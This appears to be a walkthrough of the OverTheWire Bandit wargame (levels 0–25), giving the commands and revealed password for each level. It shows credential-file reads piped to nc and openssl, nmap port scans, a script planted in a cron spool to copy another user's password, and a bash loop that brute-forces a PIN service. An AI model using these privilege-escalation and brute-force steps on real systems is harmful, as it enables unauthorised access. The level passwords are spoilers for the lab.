### bandit0
```
$ ssh bandit.labs.overthewire.org -p 2220 -l bandit0
bandit0
```
### bandit0>1
```
$ cat readme
boJ9jbbUNNfktd78OOpsqOltutMc3MY1
```
### bandit1>2
```
$ cat ~/-
CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9
```
### bandit2>3
```
$ cat spaces\ in\ this\ filename
UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK
```
### bandit3>4
```
$ cat inhere/.hidden
pIwrPrtPN36QITSp3EQaw936yaFoFgAB
```
### bandit4>5
```
$ file inhere/* | grep ASCII
$ cat inhere/-file07
koReBOKuIDDepwhWk7jZC0RTdopnAYKh
```
### bandit5>6
```
$ find ./inhere -size 1033c \! -executable
$ cat ./inhere/maybehere07/.file2
DXjZPULLxYr17uwoI01bNLQbtFemEgo7
```
### bandit6>7
```
$ find / -size 33c -user bandit7 -group bandit6 2>/dev/null
$ cat /var/lib/dpkg/info/bandit7.password
HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs
```
### bandit7>8
```
$ grep millionth data.txt
cvX2JJa4CFALtqS87jk27qwqGhBM9plV
```
### bandit8>9
```
$ sort data.txt | uniq -u
UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR
```
### bandit9>10
```
$ strings data.txt | grep =
truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk
```
### bandit10>11
```
$ base64 -d data.txt
IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR
```
### bandit11>12
```
$ cat data.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m'
5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu
```
### bandit12>13
```
$ mkdir /tmp/xx88
$ cp data.txt /tmp/xx88/
$ cd /tmp/xx88
$ man xxd
$ xxd -r data.txt > data
$ file data
$ mv data data.gz
$ gzip -d data.gz
$ file data
$ bzip2 -d data
$ file data.out
$ mv data.out data.gz
$ gzip -d data.gz
$ file data
$ tar xvf data
$ file data5.bin
$ tar xvf data5.bin
$ file data6.bin
$ bzip2 -d data6.bin
$ file data6.bin.out
$ tar xvf data6.bin.out
$ file data8.bin
$ mv data8.bin data8.gz
$ gunzip data8.gz
$ file data8
$ cat data8
8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL
```
### bandit13>14
```
$ ls
$ ssh localhost -i sshkey.private -l bandit14
```
### bandit14>15
```
$ cat /etc/bandit_pass/bandit14 | nc 127.0.0.1 30000
BfMYroe26WYalil77FoDi9qh59eK5xNr
```
### bandit15>16
The -ign_eof keeps the connection open to read the response.
```
$ cat /etc/bandit_pass/bandit15 | openssl s_client -connect 127.0.0.1:30001 -ign_eof
cluFn7wTiGryunymYOu4RcffSxQluehd
```
### bandit16>17
```
$ nmap -n -Pn -p 31000-32000 127.0.0.1
$ nmap -n -Pn -sV -p 31046,31518,31691,31790,31960 127.0.0.1
$ cat /etc/bandit_pass/bandit16 | openssl s_client -connect 127.0.0.1:31790 -ign_eof
$ mkdir /tmp/xx89
$ cat /etc/bandit_pass/bandit16 | openssl s_client -connect 127.0.0.1:31790 -ign_eof > /tmp/xx89/ssh_key_bandit17
```
edit the file and remain the private key part
```
$ vi /tmp/xx89/ssh_key_bandit17
```
change the permissions of ssh key file
keys need to be only accessible by you
```
$ chmod 600 /tmp/xx89/ssh_key_bandit17
$ ssh localhost -i /tmp/xx89/ssh_key_bandit17 -l bandit17
```
### bandit17>18
```
$ diff passwords.old passwords.new
kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd
```
### bandit18>19
```
$ scp -P 2220 bandit18@bandit.labs.overthewire.org:readme .
$ cat readme
IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x
```
### bandit19>bandit20
```
$ ./bandit20-do
$ ./bandit20-do whoami
$ ./bandit20-do cat /etc/bandit_pass/bandit20
GbKksEFF4yrVs6il55v6gwY5aVje5f0j
```
### bandit20>21
for docker issue do the port forwarding
open 1234 on your pc and gorward it to port 22 at bandit localhost
```
$ ssh -l bandit20 -p 2220 -L 1234:localhost:22 bandit.labs.overthewire.org
```
after that open two connections from your localhost
```
$ ssh localhost -p 1234 -l bandit20
$ ssh localhost -p 1234 -l bandit20
```
open nc listener in one of these sessions
```
$ nc -l -p 3333
```
start the suid program from another
```
$ ./suconnect 3333
```
send the bandit20 pass from listening server (netcat) side
and get back the bandit21 pass
```
gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
```
### bandit21>22
examine the /etc/cron.d and see the
```
$ cat /etc/cron.d/cronjob_bandit22
```
$ script was "/usr/bin/cronjob_bandit22.sh"
```
$ ls -al /usr/bin/cronjob_bandit22.sh
```
bandit21 can execute so execute it to see the error message
```
$ /usr/bin/cronjob_bandit22.sh
/tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv: Permission denied
$ ls -al /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
```
we have read permissions so open it and finish
```
$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
```
### bandit22>23
examine the  /etc/cron.d
```
$ cat /etc/cron.d/cronjob_bandit23
```
script was "/usr/bin/cronjob_bandit23.sh"
```
$ ls -al /usr/bin/cronjob_bandit23.sh
```
bandit22 can execute so execute it to see how it works
and also open and read the code
see that it make a hashsum of a predictable script
rewrite the core command change the bandit22 to 23 and get the target file in /tmp dir
```
$ echo I am user bandit23 | md5sum | cut -d ' ' -f -1
8ca319486bfbbc3663ea0fbe81326349
$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
```
### bandit23>24
examine the */etc/cron.d*
```
$ cat /etc/cron.d/cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
```
*cronjob_bandit24.sh* script executes all scripts in */var/spool/bandit24* directory
check the directory permissions
```
$ ls -al /var/spool/
drwx-wx--- 18 bandit24 bandit23 4096 Jan 24 20:29 bandit24
```
bandit23 can not read but write to the */var/spool/bandit24* directory,
so I can write a simple script and cp to this directory
script content
```
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/xx23/pass24
```
change script and /tmp/xx24 directory permissions for bandit24 to write to
```
$ chmod 777 test.sh
$ chmod /tmp/xx24
```
cp this script to */var/spool/bandit24*
```
$ cp /tmp/xx23/test.sh /var/spool/bandit24
```
wait a minute and read pass24
```
$ cat pass24
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
```
### bandit24>25
there is a pincode checker at port 30002 check this program first
```
$ echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ0000 | nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Fail! You did not supply enough data. Try again.
Exiting.
```
I did not inser the pincode properly because there is no space between bandit24 password and pincode
I checked with the proper data
```
$ echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0000 | nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Wrong! Please enter the correct pincode. Try again.
Exiting.
```
There is a failure message that contains `Wrong!` string
I can write a script that checks all combinations of pincode
Firstly create the working directory
```
$ mkdir /tmp/ao3424
$ cd /tmp/ao3424

```
script content;
```bash
#!/bin/bash
for PIN in {2023..9999}
do
	while [ -z "$TEST" ]
	do
		TEST=$(echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $PIN" | nc 127.0.0.1 30002)
		if [ -z "$TEST" ]
		then
			sleep 2
		fi
	done
	if [[ $TEST != *"Wrong"* ]];
	then
		echo $TEST
		echo "gotcha  $PIN" | tee /tmp/ao3424/pass25
		break
	fi
	echo "$TEST $PIN"
	TEST=""
done
```
Result after *5540* try
```
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space. Correct! The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG Exiting.
```
bandit25>26

